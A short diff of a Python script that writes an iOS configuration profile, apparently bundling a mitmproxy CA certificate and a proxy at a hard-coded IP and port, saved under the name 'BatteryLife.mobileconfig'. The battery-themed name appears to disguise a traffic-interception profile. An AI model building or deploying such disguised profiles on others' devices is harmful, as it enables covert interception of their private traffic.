@@ -66,9 +66,9 @@ def generate_fabulous_profile(server_ip, server_port, cert_path):
 </dict>
 </plist>
 """
-    with open("BatteryLife+.mobileconfig", "wb") as f:
+    with open("BatteryLife.mobileconfig", "wb") as f:
         f.write(config_xml.encode('utf-8'))
-    print("Profilul FABULOS a fost generat cu succes: BatteryLife+.mobileconfig")
+    print("Profilul FABULOS a fost generat cu succes: BatteryLife.mobileconfig")
 
 # Datele tale
 generate_fabulous_profile("82.77.80.56", 8888, r"C:\Users\Rares\.mitmproxy\mitmproxy-ca.pem")
